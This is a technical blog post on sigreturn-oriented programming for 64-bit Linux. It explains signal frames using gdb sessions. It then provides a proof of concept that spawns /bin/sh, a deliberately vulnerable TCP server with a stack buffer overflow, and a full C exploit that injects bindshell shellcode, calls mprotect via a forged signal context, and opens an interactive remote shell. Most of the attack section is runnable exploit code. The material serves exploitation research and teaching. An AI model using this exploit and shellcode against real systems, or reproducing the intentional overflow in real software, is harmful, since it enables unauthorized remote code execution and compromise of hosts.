---
layout: default
title:  "Playing with signals: An overview on sigreturn oriented programming"
date:   2015-01-03 10:52:43 +0200
categories: exploit, sigreturn oriented programming
---

Back to last GreHack edition, Herbert Bos has presented a novel technique to
exploit stack-based overflows more reliably on Linux. We review hereafter this
new exploitation technique and provide an exploit along with the vulnerable
server. Even if this technique is portable to multiple platforms, we will focus
on a 64-bit Linux OS in this blog post.

All sample code used in this blogpost is available for download
[here](https://github.com/mtalbi/write-up/tree/master/srop)

## We've got a signal

When the kernel delivers a signal, it creates a frame on the stack where it
stores the current execution context (flags, registers, etc.) and then gives
the control to the signal handler. After handling the signal, the kernel calls
sigreturn to resume the execution. More precisely, the kernel uses the
following structure pushed previously on the stack to recover the process
context. A closer look at this structure is given by figure 1.

{% highlight c %}
typedef struct ucontext {
    unsigned long int    uc_flags;
    struct ucontext     *uc_link;
    stack_t              uc_stack;
    mcontext_t           uc_mcontext;
    __sigset_t           uc_sigmask;
    struct _libc_fpstate __fpregs_mem;
} ucontext_t;
{% endhighlight %}

Now, let’s debug the following program (sig.c) to see what really happens when
handling a signal on Linux. This program simply registers a signal handler to
manage SIGINT signals.

{% highlight c %}
#include <stdio.h>
#include <signal.h>
 
void handle_signal(int signum)
{
    printf("handling signal: %d\n", signum);
}
 
int main()
{
    signal(SIGINT, (void *)handle_signal);
    printf("catch me if you can\n");
    while(1) {}
    return 0;
}

/* struct definition for debugging purpose */
struct sigcontext sigcontext;
{% endhighlight %}

First of all, we need to tell gdb to not intercept this signal:

{% highlight terminal %}
gdb$ handle SIGINT nostop pass
Signal        Stop      Print   Pass to program Description
SIGINT        No        Yes     Yes             Interrupt
{% endhighlight %}

Then, we set a breakpoint at the signal handling function, start the program
and hit CTRLˆC to reach the signal handler code.

{% highlight terminal %}
gdb$ b handle_signal
Breakpoint 1 at 0x4005a7: file sig.c, line 6.
gdb$ r
Starting program: /home/mtalbi/sig
hit CTRL^C to catch me
^C
Program received signal SIGINT, Interrupt.
 
Breakpoint 1, handle_signal (signum=0x2) at sig.c:6
6               printf("handling signal: %d", signum);
gdb$ bt
#0  handle_signal (signum=0x2) at sig.c:6
#1  <signal handler called>
#2  main () at sig.c:13
{% endhighlight %}

We note here that the frame #1 is created in order to resume the process
execution at the point where it was interrupted before. This is confirmed by
checking the instructions pointed by rip which corresponds to sigreturn
syscall:

{% highlight terminal %}
gdb$ frame 1
#1  <signal handler called>
gdb$ x/2i $rip
=> 0x7ffff7a844f0:      mov    $0xf,%rax
   0x7ffff7a844f7:      syscall 
{% endhighlight %}

Figure 1 shows the stack at signal handling function entry point.

![]({{site.baseurl}}/images/srop_stack.png){:width="300px" .center}
*Figure 1: Stack at signal handling function entry point*

We can check the values of some saved registers and flags. Note that sigcontext
structure is the same as uc_mcontext structure. It is located at rbp + 7 * 8
according to figure 1. It holds saved registers and flags value:

{% highlight terminal %}
gdb$ frame 0
...
gdb$ p ((struct sigcontext *)($rbp + 7 * 8))->rip 
$5 = 0x4005da
gdb$ p ((struct sigcontext *)($rbp + 7 * 8))->rsp
$6 = 0x7fffffffe110
gdb$ p ((struct sigcontext *)($rbp + 7 * 8))->rax
$7 = 0x17
gdb$ p ((struct sigcontext *)($rbp + 7 * 8))->cs
$8 = 0x33
gdb$ p ((struct sigcontext *)($rbp + 7 * 8))->eflags
$9 = 0x202
{% endhighlight %}

Now, we can verify that after handling the signal, registers will recover their
values:

{% highlight terminal %}
gdb$ b 13
Breakpoint 2 at 0x4005da: file sig.c, line 13.
gdb$ c
Continuing.
handling signal: 2
 
Breakpoint 2, main () at sig.c:13
13              while(1) {}
gdb$ i r
...
rax            0x17     0x17
rsp            0x7fffffffe110   0x7fffffffe110
eflags         0x202    [ IF ]
cs             0x33     0x33
...
{% endhighlight %}

## Exploitation

If we manage to overflow a saved instruction pointer with sigreturn address and
forge a uc mcontext structure by adjusting registers and flags values, then we
can execute any syscall. It may be a litte confusing here. In effect, trying to
execute a syscall by returning on another syscall (sigreturn) may be strange at
first sight. Well, the main difference here is that the latter does not require
any parameters at all. All we need is a gadget that sets rax to 0xf to run any
system call through sigreturn syscall. Gadgets are small pieces of instructions
ending with a ret instruction. These gadgets are chained together to perform a
specific action. This technique is well-known as ROP: Return-Oriented
Programming [Sha07].

Surprisingly, it is quite easy to find a syscall ; ret gadget on some Linux
distribution where the vsyscall map is still in use. The vsyscall page is
mapped at fixed location into all user-space processes. For interested readers,
here is good link about vsyscall.

{% highlight terminal %}
mtalbi@mtalbi:/home/mtalbi/srop$ cat /proc/self/maps
...
7ffffe5ff000-7ffffe600000 r-xp 00000000 00:00 0         [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
...
gdb$ x/3i 0xffffffffff600000
   0xffffffffff600000:  mov    rax,0x60
   0xffffffffff600007:  syscall 
   0xffffffffff600009:  ret 
{% endhighlight %}

Bosman and Bos list in [BB14] locations of sigreturn and syscall gadgets for
different operating systems including FreeBSD and Mac OS X.

Assumed that we found the required gadgets, we need to arrange our payload as
shown in figure 3 in order to successfully exploit a classic stack-based
overflow. Note that zeroes should be allowed in the payload (e.g. a non strcpy
vulnerability); otherwise, we need to find a way to zero some parts of
uc_mcontext structure.

The following code (srop.c) is a proof of concept of sigreturn oriented
programming that starts a /bin/sh shell:

{% highlight c %}
#include <stdio.h>
#include <string.h>
#include <signal.h>
 
#define SYSCALL 0xffffffffff600007
 
struct ucontext ctx;
char *shell[] = {"/bin/sh", NULL};
 
void gadget();
 
int main()
{
    unsigned long *ret;
 
    /* initializing the context structure */
    bzero(&ctx, sizeof(struct ucontext));
 
    /* setting rip value (points to syscall address) */
    ctx.uc_mcontext.gregs[16] = SYSCALL;
 
    /* setting 0x3b in rax (execve syscall) */
    ctx.uc_mcontext.gregs[13] = 0x3b;
 
    /* setting first arg of execve in rdi */
    ctx.uc_mcontext.gregs[8] = shell[0];
 
    /* setting second arg of execv in rsi */
    ctx.uc_mcontext.gregs[9] = shell;
 
    /* cs = 0x33 */
    ctx.uc_mcontext.gregs[18] = 0x33;
 
    /* overflowing */
    ret = (unsigned long *)&ret + 2;
    *ret = (int)gadget + 4; //skip gadget's function prologue
    *(ret + 1) = SYSCALL;
    memcpy(ret + 2, &ctx, sizeof(struct ucontext));
    return 0;
}
 
void gadget()
{
    asm("mov $0xf,%rax\n");
    asm("retq\n");
}
{% endhighlight %}

The programm fills a uc_mcontext structure with execve syscall parameters.
Additionally, the cs register is set to 0x33:

*   Instruction pointer rip points to syscall; ret gadget.
*   rax register holds execve syscall number.
*   rdi register holds the first paramater of execve (“/bin/sh” address).
*   rsi register holds the second parameter of execve (“/bin/sh” arguments).
*   rdx register holds the last parameter of execve (zeroed at struture initialization).

Then, the program overflows the saved rip pointer with mov %rax, $0xf; ret
gadget address (added artificially to the program through gadget function).
This gadget is followed by the syscall gadget address. So, when the main
function will return, these two gadgets will be executed resulting in sigreturn
system call which will set registers values from the previously filled
structure. After sigreturn, execve will be called as rip points now to syscall
gadget and rax holds the syscall number of execve. In our example, execve will
start /bin/sh shell.

## Code

In this section we provide a vulnerable server
([vuln.c](https://github.com/mtalbi/write-up/blob/master/srop/vuln.c)) and use
the SROP techniqpue to exploit it
([exploit.c](https://github.com/mtalbi/write-up/blob/master/srop/exploit.c)).

### Vulnerable server

The following program is a simple server that replies back with a welcoming
message after receiving some data from client. The vulnerability is present in
the handle_conn function where we can read more data from client (4096 bytes)
than the destination array (input) can hold (1024 bytes). The program is
therefore vulnerable to a classical stack-based overflow.

{% highlight c tabsize=4 %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
 
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
#define PAGE_SIZE 0x1000
#define PORT 7777
 
// in .bss
char data[PAGE_SIZE * 2];

void init();
void handle_error(char *);
int handle_conn(int);
int welcome(int);

 
void init()
{
	struct sockaddr_in sa;
	int s, c, size, k = 1;
 
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr.s_addr = INADDR_ANY;
 
	size = sizeof(struct sockaddr);
 
	if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		handle_error("socket failed\n");
	}
 
	if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &k, sizeof(int)) == -1) {
		handle_error("setsockopt failed\n");
	}
 
	if(bind(s, (struct sockaddr *)&sa, size)) {
		handle_error("bind failed\n");
	}
 
	if(listen(s, 3) < 0) {
		handle_error("listen failed\n");
	}
 
	while(1) {
		if((c = accept(s, (struct sockaddr *)NULL, NULL)) < 0) {
			handle_error("accept failed\n");
		}
		handle_conn(c);
	}
}
 
int handle_conn(int c)
{
	char input[0x400];
	int amt;
	//too large data !!!
	if((amt = read(c, input, PAGE_SIZE) < 0)) {
		handle_error("receive failed\n");
	}
	memcpy(data, input, PAGE_SIZE);
	welcome(c);
	close(c);
	return 0;
 
}
 
int welcome(int c)
{
	int amt;
	const char *msg = "I'm vulnerable program running with root priviledges!!\nPlease do not exploit me";
 
	write(c, msg, strlen(msg));
 
	if((amt = write(c, data, strlen(data))) < 0) {
		handle_error("send failed\n");
	}
	return 0;
}
 
void handle_error(char *msg)
{
	perror(msg);
	exit(-1);
}
 
void gadget()
{
	asm("mov $0xf,%rax\n");
	asm("retq\n");
}
 
int main()
{
	init();
	return 0;
}
{% endhighlight %}

### Exploit

We know that our payload will be copied in a fixed location in .bss. (at
0x6012c0). Our strategy is to copy a shellcode there and then call mprotect
syscall in order to change page protection starting at 0x601000 (must be a
multiple ot the page size).

![]({{site.baseurl}}/images/srop_bss.png){: .center}
*Figure 2: Payload copied in .bss*

In this exploit, we overflow our vulnerable buffer as shown by figure 3. First,
we fill our buffer with a nop sled (not necessary) followed by a classical
bindshell. This executable payload is prepended with an address pointing to the
shellcode in .bss (see figure 2).

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/mman.h>
#include <errno.h>
 
#define HOSTNAME "localhost"
#define PORT     7777
#define POWN     31337
#define SIZE     0x400 + 8*2
 
#define SYSCALL_GADGET   0xffffffffff600007
#define RAX_15_GADGET    0x400ad3
#define DATA             0x6012c0
#define MPROTECT_BASE    0x601000 //must be a multiple of page_size (in .bss)
#define MPROTECT_SYSCALL 0xa
#define FLAGS            0x33
#define PAGE_SIZE        4096
 
#define COLOR_SHELL      "\033[31;01mbind-shell\033[00m > "
 
struct payload_t {
	unsigned long   ret;
	char            nopshell[SIZE];
	unsigned long   gadget;
	unsigned long   sigret;
	struct ucontext context;
};
 
unsigned char shellcode[] = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
                            "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
                            "\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
                            "\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
                            "\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
                            "\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
                            "\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
                            "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
                            "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
                            "\x5f\x6a\x3b\x58\x0f\x05";
 
int setsock(char *hostname, int port);
void session(int s);
void overflows(int s);
int handle_error(char *msg);
 
int main(int argc, char **argv)
{
	int s;
	printf("[1] connecting to target ... \n");
	s = setsock(HOSTNAME, PORT);
	printf("[+] connected \n");
	printf("[2] overflowing ... \n");
	overflows(s);
	s = setsock(HOSTNAME, POWN);
	session(s);
	return 0;
}
 
void overflows(int s)
{
	struct payload_t payload;
	char output[0x400];
 
	memset(payload.nopshell, 0x90, SIZE);
	strncpy(payload.nopshell, shellcode, strlen(shellcode));
 
	payload.ret = DATA + 0x8; //precise address of nop sled
	payload.gadget = RAX_15_GADGET;
	payload.sigret = SYSCALL_GADGET;
 
	/* initializing the context structure */
	bzero(&payload.context, sizeof(struct ucontext));
 
	/* setting first arg of mprotect in rdi */
	payload.context.uc_mcontext.gregs[8] = MPROTECT_BASE;
 
	/* setting second arg of mprotect in rsi */
	payload.context.uc_mcontext.gregs[9] = PAGE_SIZE;
 
	/* setting third arg of mprotect in rdx */
	payload.context.uc_mcontext.gregs[12] = PROT_READ | PROT_WRITE | PROT_EXEC;
 
	/* setting mprotect syscall number in rax */
	payload.context.uc_mcontext.gregs[13] = MPROTECT_SYSCALL;
 
	/*
	 * jumping into nop sled after mprotect syscall.
	 * setting rsp value
	 */
	payload.context.uc_mcontext.gregs[15] = DATA;
 
	/* setting rip value (points to syscall address) */
	payload.context.uc_mcontext.gregs[16] = SYSCALL_GADGET;
 
	/* cs = 0x33 */
	payload.context.uc_mcontext.gregs[18] = FLAGS;
 
	write(s, &payload, sizeof(payload));
 
	read(s, output, 0x400);
}
 
int setsock(char *hostname, int port)
{
	int sock;
	struct hostent *hent;
	struct sockaddr_in sa;
	struct in_addr ia;
 
	hent = gethostbyname(hostname);
	if(hent) {
		memcpy(&ia.s_addr, hent->h_addr, 4);
	}
	else if((ia.s_addr = inet_addr(hostname)) == INADDR_ANY) {
		handle_error("incorrect address !!!\n");
	}
 
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		handle_error("socket failed !!!\n");
	}
 
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = ia.s_addr;
 
	if(connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
		handle_error("connection failed !!!!\n");
	}
 
	return sock;
}
 
void session(int s)
{
	char buf[1024];
	int amt;
 
	fd_set fds;
 
	printf("[!] enjoy your shell \n");
	fputs(COLOR_SHELL, stderr);
	FD_ZERO(&fds);
	while(1) {
		FD_SET(s, &fds);
		FD_SET(0, &fds);
		select(s+1, &fds, NULL, NULL, NULL);
 
		if(FD_ISSET(0, &fds)) {
			if((amt = read(0, buf, 1024)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			write(s, buf, strlen(buf));
		}
 
		if(FD_ISSET(s, &fds)) {
			if((amt = read(s, buf, 1024)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			printf("%s", buf);
			fputs(COLOR_SHELL, stderr);
		}
	}
}
 
int handle_error(char *msg)
{
	perror(msg);
	exit(-1);
}
{% endhighlight %}

Our goal is to change protection of memory page containing our shellcode. More
precisely, we want to make the following call so that we can execute our
shellcode:

{% highlight c %}
mmprotect(0x601000, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
{% endhighlight %}

Here, is what happens when the vulnerable function returns:

1.   The artificial gadget is executed. It sets rax register to 15.
1.   Our artificial gadget is followed by a syscall gadget that will result in a sigreturn call.
1.   The sigreturn uses our fake uc_mcontext structure to restore registers values. Only non shaded parameters in figure 3 are relevant to the exploit. After this call, rip points to syscall gadget, rax is set to mprotect syscall number, and rdi, rsi and rdx hold the parameters of mprotect function. Additionally, rsp points to our payload in .bss.
1.   mprotect syscall is executed.
1.   ret instruction of syscall gadget is executed. This instruction will set instruction pointer to the address popped from rsp. This address points to our shellcode (see figure 2).
1.   The shellcode is executed.

![]({{site.baseurl}}/images/srop_exploit.png){:width="270px" .center}
*Figure 3: Stack after overflowing input buffer*

### Replaying the exploit

The above code has been compiled using gcc (gcc -g -o vuln vuln.c) on a
Debian Wheezy running on x_86_64 arch. Before reproducing this exploit, you
need to adjust first the following addresses:

*   **SYSCALL_GADGET**
{% highlight terminal %}
mtalbi@mtalbi:/home/mtalbi/srop$ cat /proc/self/maps
...
7ffffe5ff000-7ffffe600000 r-xp 00000000 00:00 0         [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
...
gdb$ x/3i 0xffffffffff600000
   0xffffffffff600000:  mov    rax,0x60
   0xffffffffff600007:  syscall 
   0xffffffffff600009:  ret
{% endhighlight %}

*   **RAX_15_GADGET**
{% highlight terminal %}
mtalbi@mtalbi:/home/mtalbi/srop$ gdb server
(gdb) disas gadget
Dump of assembler code for function gadget:
   0x0000000000400acf <+0>:     push   %rbp
   0x0000000000400ad0 <+1>:     mov    %rsp,%rbp
   0x0000000000400ad3 <+4>:     mov    $0xf,%rax
   0x0000000000400ada <+11>:    retq   
   0x0000000000400adb <+12>:    pop    %rbp
   0x0000000000400adc <+13>:    retq   
End of assembler dump.
{% endhighlight %}

*   **DATA**
{% highlight terminal %}
(gdb) p &data
$1 = (char (*)[8192]) 0x6012c0
{% endhighlight %}

## References

*   **[BB14]** Erik Bosman and Herbert Bos. We got signal. a return to portable exploits. (working title, subject to change.). In Security & Privacy (Oakland), San Jose, CA, USA, May 2014. IEEE.

*   **[Sha07]** Hovav Shacham. The geometry of innocent flesh on the bone: Return-into-libc without function calls (on the x86). In Proceedings of the 14th ACM Conference on Computer and Communications Security, CCS ’07, pages 552– 561, New York, NY, USA, 2007. ACM.
